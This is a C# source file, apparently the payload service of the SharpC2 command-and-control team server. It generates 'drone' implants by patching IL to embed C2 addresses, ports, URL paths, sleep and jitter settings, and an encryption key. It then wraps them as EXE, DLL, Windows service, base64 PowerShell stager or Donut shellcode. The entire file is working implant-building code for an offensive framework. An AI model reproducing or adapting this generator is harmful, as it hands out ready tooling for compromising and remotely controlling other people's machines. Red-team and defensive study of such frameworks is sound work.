using System.Text;

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using dnlib.PE;

using Donut;
using Donut.Structs;

using TeamServer.C2Profiles;
using TeamServer.Handlers;
using TeamServer.Interfaces;
using TeamServer.Utilities;

namespace TeamServer.Services;

public class PayloadService : IPayloadService
{
    private readonly ICryptoService _crypto;

    public PayloadService(ICryptoService crypto)
    {
        _crypto = crypto;
    }

    public async Task<byte[]> GeneratePayload(Handler handler, PayloadFormat format)
    {
        // generate the assembly
        var drone = handler.PayloadType switch
        {
            PayloadType.HTTP => await GenerateHttpDrone((HttpHandler)handler),
            PayloadType.HTTPS => await GenerateHttpsDrone((HttpHandler)handler),
            PayloadType.BIND_PIPE => await GenerateBindSmbDrone((SmbHandler)handler),
            PayloadType.BIND_TCP => await GenerateBindTcpDrone((TcpHandler)handler),
            PayloadType.REVERSE_TCP => await GenerateReverseTcpDrone((TcpHandler)handler),
            PayloadType.EXTERNAL => await GenerateExternalDrone((ExtHandler)handler),

            _ => throw new ArgumentOutOfRangeException()
        };

        // convert to correct format
        return format switch
        {
            PayloadFormat.EXE => await BuildExe(drone),
            PayloadFormat.DLL => BuildDll(drone),
            PayloadFormat.SVC_EXE => await BuildServiceExe(drone),
            PayloadFormat.POWERSHELL => await BuildPowerShellScript(drone),
            PayloadFormat.SHELLCODE => await BuildShellcode(drone),
            PayloadFormat.ASSEMBLY => drone,
            
            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
        };
    }

    private async Task<byte[]> GenerateHttpDrone(HttpHandler handler)
    {
        var drone = await GetDroneModule();
        
        // get the http handler
        var httpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.HttpCommModule");
        
        // set schema
        var schemaDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_Schema()");
        schemaDef.Body.Instructions[0].Operand = "http";
        
        // set connect address
        var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
        connectAddressDef.Body.Instructions[0].Operand = handler.ConnectAddress;
        
        // set connect port
        var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
        connectPortDef.Body.Instructions[0].Operand = handler.ConnectPort.ToString();
        
        // set uris
        EmbedUrlPaths(httpCommModuleDef, handler.C2Profile);
        
        // set sleep/jitter
        var configDef = GetTypeDef(drone, "Drone.Config");
        EmbedSleepJitter(configDef, handler.C2Profile);
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }
    
    private async Task<byte[]> GenerateHttpsDrone(HttpHandler handler)
    {
        var drone = await GetDroneModule();
        
        // get the http comm module
        var httpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.HttpCommModule");
        
        // set schema
        var schemaDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_Schema()");
        schemaDef.Body.Instructions[0].Operand = "https";
        
        // set connect address
        var connectAddressDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectAddress()");
        connectAddressDef.Body.Instructions[0].Operand = handler.ConnectAddress;
        
        // set connect port
        var connectPortDef = GetMethodDef(httpCommModuleDef, "System.String Drone.CommModules.HttpCommModule::get_ConnectPort()");
        connectPortDef.Body.Instructions[0].Operand = handler.ConnectPort.ToString();
        
        // set uris
        EmbedUrlPaths(httpCommModuleDef, handler.C2Profile);
        
        // set sleep/jitter
        var configDef = GetTypeDef(drone, "Drone.Config");
        EmbedSleepJitter(configDef, handler.C2Profile);
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private static void EmbedSleepJitter(TypeDef configDif, C2Profile profile)
    {
        var sleepDef = GetMethodDef(configDif, "System.Int32 Drone.Config::get_SleepTime()");
        var jitterDef = GetMethodDef(configDif, "System.Int32 Drone.Config::get_SleepJitter()");

        sleepDef.Body.Instructions[0].Operand = profile.Http.Sleep.ToString();
        jitterDef.Body.Instructions[0].Operand = profile.Http.Jitter.ToString();
    }

    private static void EmbedUrlPaths(TypeDef handlerDef, C2Profile profile)
    {
        var getPathsDef = GetMethodDef(handlerDef, "System.String Drone.CommModules.HttpCommModule::get_GetPaths()");
        var postPathsDef = GetMethodDef(handlerDef, "System.String Drone.CommModules.HttpCommModule::get_PostPaths()");

        getPathsDef.Body.Instructions[0].Operand = string.Join(';', profile.Http.GetPaths);
        postPathsDef.Body.Instructions[0].Operand = string.Join(';', profile.Http.PostPaths);
    }

    private async Task<byte[]> GenerateBindSmbDrone(SmbHandler handler)
    {
        var drone = await GetDroneModule();
        
        // get the smb comm module
        var smbCommModuleDef = GetTypeDef(drone, "Drone.CommModules.SmbCommModule");
        
        // set pipename
        var pipeNameDef = GetMethodDef(smbCommModuleDef, "System.String Drone.CommModules.SmbCommModule::get_PipeName()");
        pipeNameDef.Body.Instructions[0].Operand = handler.PipeName;
        
        // get main comm module
        var droneDef = GetTypeDef(drone, "Drone.Drone");
        var getCommModuleDef = GetMethodDef(droneDef, "Drone.CommModules.CommModule Drone.Drone::GetCommModule()");
        
        // smb module ctor
        var smbCommModuleCtor = GetMethodDef(smbCommModuleDef, "System.Void Drone.CommModules.SmbCommModule::.ctor()");
        
        // set main comm module
        getCommModuleDef.Body.Instructions[0].Operand = smbCommModuleCtor;
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private async Task<byte[]> GenerateBindTcpDrone(TcpHandler handler)
    {
        var drone = await GetDroneModule();
        
        // get the tcp comm module
        var tcpCommModuleDef = GetTypeDef(drone, "Drone.CommModules.TcpCommModule");

        // set port
        var portDef = GetMethodDef(tcpCommModuleDef, "System.Int32 Drone.CommModules.TcpCommModule::get_BindPort()");
        portDef.Body.Instructions[0].Operand = handler.Port.ToString();
        
        // set loopback
        var loopbackDef = GetMethodDef(tcpCommModuleDef, "System.Boolean Drone.CommModules.TcpCommModule::get_Loopback()");
        loopbackDef.Body.Instructions[0].OpCode = handler.Loopback ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
        
        // get main comm module
        var droneDef = GetTypeDef(drone, "Drone.Drone");
        var getCommModuleDef = GetMethodDef(droneDef, "Drone.CommModules.CommModule Drone.Drone::GetCommModule()");
        
        // tcp module ctor
        var tcpCommModuleCtor = GetMethodDef(tcpCommModuleDef, "System.Void Drone.CommModules.TcpCommModule::.ctor()");
        
        // set main comm module
        getCommModuleDef.Body.Instructions[0].Operand = tcpCommModuleCtor;
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private Task<byte[]> GenerateReverseTcpDrone(TcpHandler handler)
    {
        throw new NotImplementedException();
    }

    private async Task<byte[]> GenerateExternalDrone(ExtHandler handler)
    {
        var drone = await GetDroneModule();
        
        // get the ext comm module
        var extCommModuleDef = GetTypeDef(drone, "Drone.CommModules.ExtCommModule");
        
        // tcp module ctor
        var extCommModuleCtor = GetMethodDef(extCommModuleDef, "System.Void Drone.CommModules.ExtCommModule::.ctor()");
        
        // get main comm module
        var droneDef = GetTypeDef(drone, "Drone.Drone");
        var getCommModuleDef = GetMethodDef(droneDef, "Drone.CommModules.CommModule Drone.Drone::GetCommModule()");
        
        // set main comm module
        getCommModuleDef.Body.Instructions[0].Operand = extCommModuleCtor;
        
        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private static async Task<byte[]> BuildExe(byte[] drone)
    {
        var stager = await Helpers.GetEmbeddedResource("exe_stager.exe");
        
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", drone));
        module.Name = "drone.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }
    
    private static byte[] BuildDll(byte[] drone)
    {
        var module = ModuleDefMD.Load(drone);
        module.Name = "drone.dll";
        
        var programDef = GetTypeDef(module, "Drone.Program");
        var execDef = GetMethodDef(programDef, "System.Threading.Tasks.Task Drone.Program::Execute()");

        // add unmanaged export
        execDef.ExportInfo = new MethodExportInfo();
        execDef.IsUnmanagedExport = true;

        var opts = new ModuleWriterOptions(module)
        {
            PEHeadersOptions =
            {
                Machine = Machine.AMD64
            },
            Cor20HeaderOptions =
            {
                Flags = 0
            }
        };

        using var ms = new MemoryStream();
        module.Write(ms, opts);

        return ms.ToArray();
    }
    
    private static async Task<byte[]> BuildServiceExe(byte[] drone)
    {
        var shellcode = await BuildShellcode(drone);
        var stager = await Helpers.GetEmbeddedResource("svc_stager.exe");
        
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", shellcode));
        module.Name = "drone_svc.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }
    
    private static async Task<byte[]> BuildPowerShellScript(byte[] drone)
    {
        // build exe
        var exe = await BuildExe(drone);
        
        // get stager ps1
        var stager = await Helpers.GetEmbeddedResource("stager.ps1");
        var stagerText = Encoding.ASCII.GetString(stager);

        // insert exe
        stagerText = stagerText.Replace("{{DATA}}", Convert.ToBase64String(exe));
        
        // remove ZWNBSP
        stagerText = stagerText.Remove(0, 3);

        return Encoding.ASCII.GetBytes(stagerText);
    }

    private static async Task<byte[]> BuildShellcode(byte[] drone)
    {
        var tmpShellcodePath = Path.GetTempFileName().Replace(".tmp", ".bin");
        var tmpPayloadPath = Path.GetTempFileName().Replace(".tmp", ".exe");
        
        // write drone to disk
        await File.WriteAllBytesAsync(tmpPayloadPath, drone);
        
        // donut config
        var config = new DonutConfig
        {
            Arch = 3, // x86+amd64
            Bypass = 1, // none
            Domain = "SharpC2",
            Class = "Drone.Program",
            Method = "Execute",
            InputFile = tmpPayloadPath,
            Payload = tmpShellcodePath
        };
        
        // generate shellcode
        Generator.Donut_Create(ref config);
        var shellcode = await File.ReadAllBytesAsync(tmpShellcodePath);
        
        // delete temp files
        File.Delete(tmpShellcodePath);
        File.Delete(tmpPayloadPath);
        File.Delete($"{tmpShellcodePath}.b64");

        return shellcode;
    }
    
    private async Task<ModuleDef> GetDroneModule()
    {
        var bytes = await Helpers.GetEmbeddedResource("drone.dll");
        var module = ModuleDefMD.Load(bytes);

        // write in crypto key
        var key = await _crypto.GetKey();

        var cryptoClass = GetTypeDef(module,"Drone.Utilities.Crypto");
        var keyMethod = GetMethodDef(cryptoClass, "System.Byte[] Drone.Utilities.Crypto::get_Key()");
        keyMethod.Body.Instructions[0].Operand = Convert.ToBase64String(key);

        return module;
    }
    
    private static TypeDef GetTypeDef(ModuleDef module, string name)
    {
        return module.Types.Single(t => t.FullName.Equals(name, StringComparison.OrdinalIgnoreCase));
    }
    
    private static MethodDef GetMethodDef(TypeDef type, string name)
    {
        return type.Methods.Single(m => m.FullName.Equals(name, StringComparison.OrdinalIgnoreCase));
    }
}